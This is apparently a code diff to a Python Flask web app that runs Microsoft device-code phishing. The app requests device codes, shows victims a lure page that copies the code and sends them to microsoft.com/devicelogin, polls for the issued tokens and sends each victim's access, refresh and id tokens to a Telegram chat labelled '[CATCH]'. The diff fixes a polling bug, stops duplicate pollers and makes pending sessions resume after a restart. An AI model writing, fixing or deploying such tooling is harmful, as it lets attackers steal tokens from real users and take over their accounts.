@@ -27,9 +27,11 @@ MFA_DEVICES = "https://login.microsoftonline.com/organizations/oauth2/v2.0/devic
 TOKEN_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"
 
 _db_lock = threading.Lock()
+_active_polls = set()
+_poll_guard = threading.Lock()
 
 def get_db():
-    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
+    conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=10)
     conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
         session_id TEXT PRIMARY KEY,
         client_id TEXT,
@@ -47,11 +49,13 @@ def get_db():
 def db_query(query, params=(), fetch=False):
     with _db_lock:
         conn = get_db()
-        cur = conn.execute(query, params)
-        rows = cur.fetchall() if fetch else None
-        conn.commit()
-        conn.close()
-        return rows
+        try:
+            cur = conn.execute(query, params)
+            rows = cur.fetchall() if fetch else None
+            conn.commit()
+            return rows
+        finally:
+            conn.close()
 
 def send_telegram(text):
     try:
@@ -60,13 +64,11 @@ def send_telegram(text):
             json={"chat_id": CHAT_ID, "text": text},
             timeout=15,
         )
-        if r.status_code != 200:
-            print(f"[TELEGRAM ERROR] {r.status_code} {r.text}")
+        print(f"[TELEGRAM] status={r.status_code} body={r.text[:200]}")
     except Exception as e:
         print(f"[TELEGRAM ERROR] {e}")
 
 def start_session():
-    """Try every client ID until one gives us a device code. Returns dict or None."""
     for client_id in CLIENT_IDS:
         try:
             r = requests.post(MFA_DEVICES, data={
@@ -85,59 +87,103 @@ def start_session():
                 "INSERT INTO sessions (session_id, client_id, device_code, user_code, interval, expires_at, status) VALUES (?,?,?,?,?,?,?)",
                 (sid, client_id, data["device_code"], data["user_code"], interval, expires_at, "pending"),
             )
-            threading.Thread(target=poll_session, args=(sid,), daemon=True).start()
-            print(f"[FLOW OK] client={client_id}")
+            spawn_poll(sid)
+            print(f"[FLOW OK] client={client_id} user_code={data['user_code']}")
             return {"session_id": sid, "user_code": data["user_code"]}
         print(f"[FLOW FAIL] client={client_id} -> {data.get('error')}: {data.get('error_description','')[:150]}")
     return None
 
-def poll_session(session_id):
-    row = db_query("SELECT client_id, device_code, interval, expires_at FROM sessions WHERE session_id=?", (session_id,), fetch=True)
-    if not row:
-        return
-    client_id, device_code, interval, expires_at = row
-    interval = interval or 5
-    while time.time() < expires_at:
-        time.sleep(interval)
-        try:
-            r = requests.post(TOKEN_URL, data={
-                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-                "client_id": client_id,
-                "device_code": device_code,
-            }, timeout=15)
-            data = r.json()
-        except Exception as e:
-            print(f"[POLL ERROR] {e}")
-            continue
-        err = data.get("error")
-        if err == "authorization_pending":
-            continue
-        if err == "slow_down":
-            interval += 5
-            continue
-        if err:
-            print(f"[POLL ERROR] {err}: {data.get('error_description','')}")
-            db_query("UPDATE sessions SET status=? WHERE session_id=?", (f"error:{err}", session_id))
+def spawn_poll(session_id):
+    with _poll_guard:
+        if session_id in _active_polls:
             return
-        tokens = json.dumps(data)
-        db_query("UPDATE sessions SET status='done', tokens=? WHERE session_id=?", (tokens, session_id))
-        victim = "unknown"
-        try:
-            payload = data.get("id_token", "").split(".")[1]
-            payload += "=" * (-len(payload) % 4)
-            claims = json.loads(base64.urlsafe_b64decode(payload))
-            victim = claims.get("preferred_username") or claims.get("upn") or claims.get("email") or "unknown"
-        except Exception:
-            pass
-        msg = (f"[CATCH] {victim}\n"
-               f"client: {client_id}\n\n"
-               f"access_token:\n{data.get('access_token','')}\n\n"
-               f"refresh_token:\n{data.get('refresh_token','')}\n\n"
-               f"id_token:\n{data.get('id_token','')}")
-        send_telegram(msg)
-        db_query("UPDATE sessions SET notified=1 WHERE session_id=?", (session_id,))
-        return
-    db_query("UPDATE sessions SET status='expired' WHERE session_id=?", (session_id,))
+        _active_polls.add(session_id)
+    t = threading.Thread(target=poll_session, args=(session_id,), daemon=True)
+    t.start()
+
+def poll_session(session_id):
+    try:
+        rows = db_query(
+            "SELECT client_id, device_code, interval, expires_at FROM sessions WHERE session_id=?",
+            (session_id,), fetch=True
+        )
+        if not rows:
+            print(f"[POLL] no row for {session_id}")
+            return
+        client_id, device_code, interval, expires_at = rows[0]   # <-- THE FIX
+        interval = interval or 5
+        print(f"[POLL] started sid={session_id} client={client_id} interval={interval}")
+
+        while time.time() < expires_at:
+            time.sleep(interval)
+            try:
+                r = requests.post(TOKEN_URL, data={
+                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+                    "client_id": client_id,
+                    "device_code": device_code,
+                }, timeout=15)
+                data = r.json()
+            except Exception as e:
+                print(f"[POLL ERROR] request: {e}")
+                continue
+
+            err = data.get("error")
+            if err == "authorization_pending":
+                print("[POLL] pending")
+                continue
+            if err == "slow_down":
+                interval += 5
+                print(f"[POLL] slow_down, interval now {interval}")
+                continue
+            if err:
+                print(f"[POLL] error {err}: {data.get('error_description','')}")
+                db_query("UPDATE sessions SET status=? WHERE session_id=?", (f"error:{err}", session_id))
+                return
+
+            print("[POLL] TOKEN RECEIVED")
+            tokens = json.dumps(data)
+            db_query("UPDATE sessions SET status='done', tokens=? WHERE session_id=?", (tokens, session_id))
+
+            victim = "unknown"
+            try:
+                payload = data.get("id_token", "").split(".")[1]
+                payload += "=" * (-len(payload) % 4)
+                claims = json.loads(base64.urlsafe_b64decode(payload))
+                victim = (claims.get("preferred_username") or claims.get("upn")
+                          or claims.get("email") or claims.get("name") or "unknown")
+            except Exception as e:
+                print(f"[POLL] id_token parse failed: {e}")
+
+            msg = (f"[CATCH] {victim}\n"
+                   f"client: {client_id}\n\n"
+                   f"access_token:\n{data.get('access_token','')}\n\n"
+                   f"refresh_token:\n{data.get('refresh_token','')}\n\n"
+                   f"id_token:\n{data.get('id_token','')}")
+            send_telegram(msg)
+            db_query("UPDATE sessions SET notified=1 WHERE session_id=?", (session_id,))
+            return
+
+        print(f"[POLL] expired sid={session_id}")
+        db_query("UPDATE sessions SET status='expired' WHERE session_id=?", (session_id,))
+    except Exception as e:
+        print(f"[POLL FATAL] {e}")
+    finally:
+        with _poll_guard:
+            _active_polls.discard(session_id)
+
+def resume_pending():
+    """After a restart, restart pollers for any still-pending device codes."""
+    try:
+        rows = db_query(
+            "SELECT session_id FROM sessions WHERE status='pending' AND expires_at > ?",
+            (time.time(),), fetch=True
+        )
+        for (sid,) in rows:
+            spawn_poll(sid)
+        if rows:
+            print(f"[POLL] resumed {len(rows)} pending session(s)")
+    except Exception as e:
+        print(f"[POLL] resume failed: {e}")
 
 PAGE = """<!doctype html>
 <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
@@ -160,9 +206,9 @@ p{font-size:13px;color:#1b1b1b;line-height:1.5}
 </div>
 <script>
 function go(){
-  var c=document.getElementById('msg') ? document.querySelector('.code').innerText.trim() : '';
+  var c=document.querySelector('.code').innerText.trim();
   if(navigator.clipboard){navigator.clipboard.writeText(c);}
-  document.getElementById('msg').innerText='Code copied. Complete sign-in in the next screen.';
+  document.getElementById('msg').innerText='Code copied. Complete sign-in on the next screen.';
   setTimeout(function(){window.location.href='https://microsoft.com/devicelogin';},900);
 }
 </script>
@@ -188,6 +234,9 @@ def status(session_id):
     if not rows:
         return jsonify({"status": "unknown"})
     return jsonify({"status": rows[0][0]})
+
+# run resume on import so gunicorn picks up pending sessions
+resume_pending()
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
